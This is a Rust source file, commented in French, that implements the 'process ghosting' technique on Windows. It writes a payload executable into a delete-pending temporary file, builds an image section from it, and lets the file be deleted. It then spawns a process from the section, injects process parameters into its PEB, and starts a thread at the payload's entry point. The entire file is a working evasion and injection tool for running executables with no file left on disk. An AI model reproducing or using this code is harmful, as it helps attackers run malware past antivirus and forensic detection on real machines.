//Référence : https://whokilleddb.github.io/blogs/posts/process-ghosting/

use std::{
    env, ffi::{CString, OsStr}, fs, iter::once, mem::{size_of, zeroed}, os::windows::ffi::OsStrExt, path::Path, ptr::null_mut
};

use winapi::{
    shared::{
        minwindef::{DWORD, FALSE, LPCVOID, LPVOID},
        ntdef::{
            HANDLE, NTSTATUS, NT_SUCCESS, NULL, PUNICODE_STRING, PVOID, UNICODE_STRING
        },
        ntstatus::{
            STATUS_INVALID_PARAMETER, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_SUCCESS
        },
    },
    um::{
        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, WriteFile, FILE_DISPOSITION_INFO, OPEN_ALWAYS, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, WriteProcessMemory, FILE_MAP_READ}, processthreadsapi::{GetCurrentProcess, GetExitCodeProcess, GetProcessId, ProcessIdToSessionId}, winbase::{CreateFileMappingA, INFINITE}, winnt::{
            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS
        }
    },
};

use ntapi::{ntioapi::{FileDispositionInformation, NtSetInformationFile, IO_STATUS_BLOCK}, ntmmapi::{NtCreateSection, NtMapViewOfSection, NtWriteVirtualMemory}, ntpsapi::{NtCreateProcess, NtCreateThreadEx, NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION, PS_ATTRIBUTE_LIST}, ntrtl::{RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS}};

use winapi::um::synchapi::WaitForSingleObject;

#[derive(Debug)]
struct Error {
    status: NTSTATUS,
}

impl From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self {
        Self { status }
    }
}

#[repr(C)]
struct CPInfo {
    p_handle: HANDLE,
    pb_info: PROCESS_BASIC_INFORMATION,
}

fn to_wide_null(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(once(0)).collect()
}
// type de votre entrypoint

unsafe fn create_remote_thread(
    h_process: HANDLE,
    entry_addr: PVOID,
    suspended: bool,
) -> Result<HANDLE, Error> {
    let mut h_thread: HANDLE = null_mut();
    let create_flags = if suspended { 
        0x00000004 /* THREAD_CREATE_FLAGS_CREATE_SUSPENDED */ 
    } else { 0 };

    let status: NTSTATUS = unsafe { NtCreateThreadEx(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),           // POBJECT_ATTRIBUTES
        h_process,
        entry_addr,        // PUSER_THREAD_START_ROUTINE
        null_mut(),           // Argument
        create_flags,
        0,                    // ZeroBits
        0,                    // StackSize
        0,                    // MaximumStackSize
        null_mut::<PS_ATTRIBUTE_LIST>(), // pas d’attributs
    ) };
    if status < 0 {
        return Err(Error::from(status));
    }
    Ok(h_thread)
}

/// Construit en mémoire locale la structure RTL_USER_PROCESS_PARAMETERS
///    avec RtlCreateProcessParametersEx. Retourne un pointeur vers la structure.
unsafe fn build_process_parameters(
    image_path: &str,
    command_line: &str,
) -> Option<PRTL_USER_PROCESS_PARAMETERS> {
    // Chaînes wide
    let image_w = to_wide_null(image_path);
    let cmd_w   = to_wide_null(command_line);

    // Initialisation des UNICODE_STRING
    let mut us_image: UNICODE_STRING = unsafe { std::mem::zeroed() };
    unsafe { RtlInitUnicodeString(&mut us_image as PUNICODE_STRING, image_w.as_ptr()) };

    let mut us_cmd: UNICODE_STRING = unsafe { std::mem::zeroed() };
    unsafe { RtlInitUnicodeString(&mut us_cmd as PUNICODE_STRING, cmd_w.as_ptr()) };

    // Créer la structure
    let mut p_params: PRTL_USER_PROCESS_PARAMETERS = null_mut(); 
    let status = unsafe { RtlCreateProcessParametersEx(
        &mut p_params,
        &mut us_image,
        null_mut(),        // DLL path
        null_mut(),        // Current directory
        &mut us_cmd,
        null_mut(),        // Environment (NULL = hérite)
        null_mut(), null_mut(), null_mut(), null_mut(),
        0,                 // Flags (pas de RTL_USER_PROC_PARAMS_NORMALIZED)
    ) };
    if status != STATUS_SUCCESS {
        eprintln!("[!] RtlCreateProcessParametersEx a échoué : 0x{:X}", status as u32);
        return None;
    }
    Some(p_params)
}

/// 2) Injecte ces process parameters dans le process enfant et met à jour le PEB
unsafe fn inject_process_parameters(
    h_process: HANDLE,
    pbi: &PROCESS_BASIC_INFORMATION,
    p_params: PRTL_USER_PROCESS_PARAMETERS, // en réalité *mut RTL_USER_PROCESS_PARAMETERS
) -> Result<PVOID, Error> {
    // Taille de la structure
    let params_size = (unsafe { *p_params }).MaximumLength as usize;
    // Allouer dans l'espace du process
    let remote_addr = unsafe { VirtualAllocEx(
        h_process,
        null_mut(),
        params_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) };
    if remote_addr.is_null() {
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    // Copier la structure
    let mut written: usize = 0;
    let ok = unsafe { WriteProcessMemory(
        h_process,
        remote_addr,
        p_params as *const _,
        params_size,
        &mut written as *mut usize,
    ) };
    if ok == FALSE || written != params_size {
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    // Calcul de l’adresse du champ ProcessParameters dans le PEB
    const PROCESS_PARAMETERS_OFFSET: usize = if cfg!(target_pointer_width = "64") { 0x20 } else { 0x10 };
    let peb_addr = (pbi.PebBaseAddress as usize).checked_add(PROCESS_PARAMETERS_OFFSET)
        .ok_or_else(|| Error::from(STATUS_INVALID_PARAMETER))?;

    // Écrire le pointeur remote_addr dans le PEB du process enfant
    let status = unsafe { NtWriteVirtualMemory(
        h_process,
        peb_addr as PVOID,
        &remote_addr as *const _ as PVOID,
        std::mem::size_of::<PVOID>() as usize,
        null_mut(),
    ) };
    if status < 0 {
        return Err(Error::from(status));
    }

    Ok(remote_addr)
}
unsafe fn create_process(h_section: HANDLE) -> Option<*mut CPInfo> {
    // 1) allouer et zero-initialiser la structure CPInfo
    let p_info: *mut CPInfo = Box::into_raw(Box::new(unsafe { zeroed::<CPInfo>() }));
    if p_info.is_null() {
        eprintln!("[!] Impossible d'allouer CPInfo");
        return None;
    }

    // 2) appel à NtCreateProcess
    let status = unsafe { NtCreateProcess(
        &mut (*p_info).p_handle,
        PROCESS_ALL_ACCESS,
        null_mut(),               // ObjectAttributes
        GetCurrentProcess(),      // ParentProcess
        1,                        // InheritObjectTable = TRUE
        h_section,                // SectionHandle
        null_mut(),               // DebugPort
        null_mut(),               // ExceptionPort
    ) };
    if status < 0 {
        eprintln!("[!] NtCreateProcess a échoué : 0x{:X}", status as u32);
        // cleanup
        unsafe { let _ = Box::from_raw(p_info); };
        return None;
    }

    // 3) requête des informations de base du process
    let status = unsafe { NtQueryInformationProcess(
        (*p_info).p_handle,
        ProcessBasicInformation,
        &mut (*p_info).pb_info as *mut _ as *mut _,
        std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        null_mut(),
    ) };
    if status < 0 {
        eprintln!("[!] NtQueryInformationProcess a échoué : 0x{:X}", status as u32);
        unsafe { CloseHandle((*p_info).p_handle) };
        unsafe { let _ = Box::from_raw(p_info); };
        return None;
    }

    // 4) affichage du PID pour confirmation
    let pid = unsafe { GetProcessId((*p_info).p_handle) };
    println!("[+] Process ghosted créé, PID = {}", pid);
let mut session_id = 0u32;

unsafe { ProcessIdToSessionId(pid, &mut session_id) };
println!("[+] SessionId du ghosted : {}", session_id);
    Some(p_info)
}

/// Mappe la section dans le processus courant et retourne l'adresse de base + taille.
unsafe fn map_section_local(
    h_section: HANDLE,
) -> Option<(LPVOID, usize)> {
    let mut base_address: LPVOID = null_mut();
    let mut view_size: usize = 0;

    // InheritDisposition = 1 (ViewShare), AllocationType = 0, Win32Protect = PAGE_READONLY
    let status: NTSTATUS = unsafe { NtMapViewOfSection(
        h_section,
        GetCurrentProcess(),
        &mut base_address as *mut LPVOID,
        0,
        0,
        null_mut(),
        &mut view_size as *mut usize,
        1,
        0,
        PAGE_READONLY,
    ) };

    if !NT_SUCCESS(status) {
        eprintln!("[!] NtMapViewOfSection (local) a échoué : 0x{:X}", status as u32);
        return None;
    }

    println!(
        "[+] Section mappée localement à {:p}, taille 0x{:X}",
        base_address, view_size
    );
    Some((base_address, view_size))
}

/// Mappe la section dans l’espace mémoire du processus enfant et retourne l'adresse de base distante.
unsafe fn map_section_remote(
    h_section: HANDLE,
    h_process: HANDLE,
) -> Option<LPVOID> {
    let mut remote_base: LPVOID = null_mut();
    let mut view_size: usize = 0;

    let status: NTSTATUS = unsafe { NtMapViewOfSection(
        h_section,
        h_process,
        &mut remote_base as *mut LPVOID,
        0,
        0,
        null_mut(),
        &mut view_size as *mut usize,
        1,
        0,
        PAGE_READONLY,
    ) };

    if !NT_SUCCESS(status) {
        eprintln!("[!] NtMapViewOfSection (remote) a échoué : 0x{:X}", status as u32);
        return None;
    }

    println!(
        "[+] Section mappée dans l'enfant à {:p} (taille 0x{:X})",
        remote_base, view_size
    );
    Some(remote_base)
}


unsafe fn get_nt_headers (base_addr:LPVOID) -> LPVOID{
    //let dos_hdr = unsafe { &*(base_addr as *const IMAGE_DOS_HEADER) };
    let idos_hdr = base_addr as *const IMAGE_DOS_HEADER;
    
    if (unsafe { *idos_hdr }).e_magic != IMAGE_DOS_SIGNATURE {
        println!("[*] Signature DOS invalide");
        return NULL;
    }
    const MAX_OFFSET: i32 = 1024;
    let offset = (unsafe { *idos_hdr }).e_lfanew;
    if offset > MAX_OFFSET {
        return NULL;
    }
    let inh = (base_addr as usize + offset as usize) as *const IMAGE_NT_HEADERS64; //P-e prendre en charge aussi 32 bits ? 
    if (unsafe { *inh }).Signature != IMAGE_NT_SIGNATURE {
        return NULL;
    }
    inh as LPVOID
}

unsafe fn get_ep_rva (base_addr:LPVOID) -> u32{
    let nt_hdr = unsafe { get_nt_headers(base_addr) };
    if nt_hdr == NULL {
        return 0;
    }
    let nt_hdr = nt_hdr as *const IMAGE_NT_HEADERS64;//P-e prendre en charge aussi 32 bits ? 
    return unsafe { *nt_hdr }.OptionalHeader.AddressOfEntryPoint;
}

unsafe fn read_payload(payload:&str) ->Option<(PVOID,u32)>{
    let c_path = match CString::new(payload) {
        Ok(s) => s,
        Err(_) => { eprintln!("[!] Chemin invalide"); return None; }
    };
    let h_file = unsafe{ CreateFileA(
        c_path.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    )};
    if h_file == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
        return None;
    }
    println!("[+] Ouverture du payload en lecture Ok");
    
    let h_map = unsafe { CreateFileMappingA(
        h_file,
        null_mut(), 
        PAGE_READONLY,
        0, 
        0, 
        null_mut())
    };
    if h_map == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileMappingA Failed: {}", unsafe{GetLastError()});
        unsafe{CloseHandle(h_file)};
        return None;
    }
    println!("[+] CreateFileMappingA Ok");

    let mapped_addr = unsafe { MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0) };
    if mapped_addr == NULL {
        println!("[!] MapViewOfFile Failed: {}", unsafe{GetLastError()});
        unsafe { 
            CloseHandle(h_map);
            CloseHandle(h_file);
        };
        return None;
    }
    println!("[+] MapViewOfFile Ok");

    let file_size = unsafe { GetFileSize(h_file, null_mut()) };
    let payload_raw = unsafe { VirtualAlloc(
        NULL,
        file_size as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) };
    if payload_raw == NULL {
        println!("[!] VirtualAlloc Failed: {}",  unsafe{GetLastError()});
        unsafe { 
            UnmapViewOfFile(mapped_addr);
            CloseHandle(h_map);
            CloseHandle(h_file);
    };
        return None;
    }
    println!("[+] On a lu le payload, taille: 0x{:x}", file_size);

    unsafe { std::ptr::copy_nonoverlapping(
        mapped_addr as *const u8,
        payload_raw as *mut u8,
        file_size as usize,
        ) 
    };
    println!("[+] Payload copié !");

    unsafe { 
        UnmapViewOfFile(mapped_addr);
        CloseHandle(h_map);
        CloseHandle(h_file);
    };
    Some((payload_raw,file_size))

}

unsafe fn write_payload(h_file:&HANDLE,payload_bytes:LPVOID,payload_size:u32) -> Option<PVOID>{
    let mut b_written: DWORD = 0;
    let ok = unsafe { WriteFile(
        *h_file,
        payload_bytes as LPCVOID,
        payload_size,
        &mut b_written,
        null_mut(),
    ) };
    if ok == FALSE {
        println!("[!] J'ai pas su écrire le payload dans le fichier temporaire (0x{:X})", unsafe { GetLastError() });
        return None;
    }

    let mut h_section: HANDLE = null_mut();
    let status = unsafe { NtCreateSection(
        &mut h_section,
        SECTION_ALL_ACCESS,
        null_mut(),
        null_mut(),            // toute la taille du fichier
        PAGE_READONLY,
        SEC_IMAGE,
        *h_file,
    ) };
    if !NT_SUCCESS(status) {
        eprintln!("[!] NtCreateSection() failed! (0x{:X})", status as u32);
        return None;
    }
    if h_section.is_null() || h_section == INVALID_HANDLE_VALUE {
        eprintln!(
            "[!] Le handle retourné par NtCreateSection() est invalide (0x{:X})",
            status as u32
        );
        return None;
    }

    println!("[+] J'ai mon objet section");
    // On retourne le handle de section comme pointeur
    Some(h_section as LPVOID)
}

unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
    let h_file = unsafe {CreateFileA(
         cible.as_ptr() as *const _,
         DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         null_mut(),
         OPEN_ALWAYS,
         FILE_ATTRIBUTE_NORMAL,
         null_mut())
    };
    if h_file == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
        return None;
    }
    println!("[+] Création du fichier: {cible}");

    let mut io_status: IO_STATUS_BLOCK = unsafe{zeroed()};

    let mut f_fileinfo = FILE_DISPOSITION_INFO {
        DeleteFile: 1,
    };
    let status: NTSTATUS = unsafe{NtSetInformationFile(
        h_file,
        &mut io_status,
        &mut f_fileinfo as *mut _ as *mut _, //pour quoi as mut as mut wtf
        size_of::<FILE_DISPOSITION_INFO>() as u32,
        FileDispositionInformation,
    )};

    if status != STATUS_SUCCESS {
        println!("[!] NtSetInformationFile failed: 0x{:X}", status);
        unsafe{CloseHandle(h_file)};
        return None;
    }
    println!("[+] Le fichier a été mis en DELETE-PENDING");
    return Some(h_file as PVOID);

}

unsafe fn process_ghosting(t_file:&str,payload:&str) -> Result<(), Error>{
       
    println!("[+] Le fichier temporaire : {t_file}");
    println!("[+] Le payload : {payload}");
    
    if let Err(e) = fs::metadata(payload) {
        println!("[!] Erreur d'accès au fichier cible : {}", e);
        return Err(Error::from(STATUS_OBJECT_NAME_NOT_FOUND)); 
    }
    //On prépare la cible (ouverture du fichier temporaire en delete pending)
    let h_file = match unsafe{prepare_target(t_file)} {
        Some(handle) => handle,
        None => return Err(Error::from(STATUS_INVALID_PARAMETER)),
    };
    println!("[+] Handle de fichier obtenu: {:?}", h_file);

    //On lit le vrai exe pour le mettre en mémoire
    let (payload_bytes,payload_size) = unsafe { read_payload(payload).ok_or_else(|| Error {status:STATUS_INVALID_PARAMETER}) }?;
        println!("[+] Payload chargé {} bytes", payload_size);

    
    //On va écrire le payload dans le fichier temporaire et créer la section Object
    let h_section = match unsafe {write_payload(&h_file, payload_bytes, payload_size)} {
        Some(handle) => handle,
        None => return Err(Error::from(STATUS_INVALID_PARAMETER))
    };
    
       println!("[+] Section créée: {:?}", h_section);
    //Mapper le fichier dans le format PE et fetch un pointer à NT struct header
    // entry point
    let entry_rva = unsafe { get_ep_rva(payload_bytes) };
    if entry_rva == 0 {
        println!("[!] Erreur car Entry_point = 0 ");
        unsafe { CloseHandle(h_section) };
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }
    println!("[+] Entry point (RVA): 0x{:X}", entry_rva);
    
    //On peut delete le fichier mtn
    unsafe { CloseHandle(h_file) };
    // Mapping de la section dans notre processus
     let (local_base, local_size) = unsafe { map_section_local(h_section as HANDLE)
        .ok_or_else(|| {
            CloseHandle(h_section as HANDLE);
            Error::from(STATUS_INVALID_PARAMETER)
        }) }?;
    println!(
        "[+] Section mappée localement @ {:p} (taille 0x{:X})",
        local_base, local_size
    );

     //Création du process ghosted
    let cp_info = unsafe { create_process(h_section as HANDLE)
        .ok_or_else(|| {
            CloseHandle(h_section as HANDLE);
            Error::from(STATUS_INVALID_PARAMETER)
        }) }?;
    let cp_ref: &CPInfo = unsafe { &*cp_info };
    let h_process  = cp_ref.p_handle;

     let remote_base = unsafe { map_section_remote(h_section as HANDLE, h_process)
        .ok_or_else(|| {
            CloseHandle(h_section as HANDLE);
            CloseHandle(h_process);
            Error::from(STATUS_INVALID_PARAMETER)
        }) }?;
    println!(
        "[+] Section mappée dans l'enfant @ {:p}",
        remote_base
    );

     let entry_addr = (remote_base as usize).checked_add(entry_rva as usize)
        .ok_or_else(|| Error::from(STATUS_INVALID_PARAMETER))?;
    println!("[+] Adresse d'entrée absolue: 0x{:X}", entry_addr);
       // On passe le chemin du binaire ghosted comme image_path et
    // la ligne de commande qu'on veut lui fournir (ici juste son propre nom).
    let image_path = t_file;
    let cmd_line = format!("\"{}\"", t_file);  
    
    let p_params = unsafe { build_process_parameters(image_path, &cmd_line)
        .ok_or_else(|| {
            CloseHandle(h_section as HANDLE);
            CloseHandle(h_process);
            Error::from(STATUS_INVALID_PARAMETER)
        }) }?;
    println!("[+] ProcessParameters construits en mémoire locale");
    // injecter dans le process enfant
    let remote_params = unsafe { inject_process_parameters(h_process, &cp_ref.pb_info, p_params)
        .map_err(|e| {
            // cleanup en cas d'erreur
            CloseHandle(h_section as HANDLE);
            CloseHandle(h_process);
            e
        }) }?;
    println!(
        "[+] ProcessParameters injectés à l'adresse distante {:p}",
        remote_params
    );
    //ENFIN, on peut créer le thread et lancer le payload
     let h_thread = unsafe { create_remote_thread(h_process, entry_addr as PVOID, false)
        .map_err(|e| {
            CloseHandle(h_section as HANDLE);
            CloseHandle(h_process);
            e
        }) }?;
    println!("[+] Thread créé, handle = {:?}", h_thread);
        
    let mut exit_code = 0u32;
    unsafe { GetExitCodeProcess(h_process, &mut exit_code) };
    println!("[+] Exit code du processus distant : {:#X}", exit_code);

    unsafe{
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
        CloseHandle(h_section);
        CloseHandle(h_process);
    }
    let mut exit = 0u32;
unsafe { GetExitCodeProcess(h_process, &mut exit) };
println!("[+] Process exit code: 0x{:X}", exit);
    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        let procname = Path::new(args[0].as_str())
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();
        println!("Usage: {} <temp_file> <payload>", procname);
        std::process::exit(1);
    }
    let t_file = &args[1];
    let payload = &args[2];

    unsafe {
        match process_ghosting(t_file, payload) {
            Ok(()) => println!("[+] Le process ghosting a fonctionné !"),
            Err(err) => println!("[!] Error: 0x{:x}", err.status),
        }
    }
}

